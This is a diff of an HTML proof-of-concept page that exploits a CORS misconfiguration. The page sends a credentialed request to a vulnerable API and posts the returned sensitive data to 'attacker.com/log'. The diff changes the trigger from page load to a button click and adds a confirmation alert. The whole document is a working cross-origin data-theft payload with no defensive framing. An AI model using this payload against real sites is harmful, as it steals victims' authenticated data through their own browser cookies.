@@ -1,22 +1,25 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html>
 <head>
     <title>PoC CORS Attack</title>
 </head>
 <body>
     <h1>PoC: Exploiting CORS Misconfiguration</h1>
+    <button id="fetchDataButton">Fetch Sensitive Data</button>
+    
     <script>
-        async function fetchSensitiveData() {
+        document.getElementById('fetchDataButton').addEventListener('click', async function() {
             try {
                 const response = await fetch('https://vulnerableapp.com/api/sensitive-data', {
                     method: 'GET',
                     credentials: 'include' // Send cookies along with the request
-                }); // new
+                });
 
                 if (response.ok) {
                     const data = await response.json();
                     console.log("Fetched Data:", data);
 
+                    // Send the fetched data to the attacker's server
                     await fetch('https://attacker.com/log', {
                         method: 'POST',
                         headers: {
@@ -24,15 +27,15 @@
                         },
                         body: JSON.stringify({ stolenData: data })
                     });
+
+                    alert("Data fetched and sent!");
                 } else {
                     console.log("Failed to fetch data:", response.status);
                 }
             } catch (error) {
                 console.error("Error:", error);
             }
-        }
-
-        fetchSensitiveData();
+        });
     </script>
 </body>
 </html>
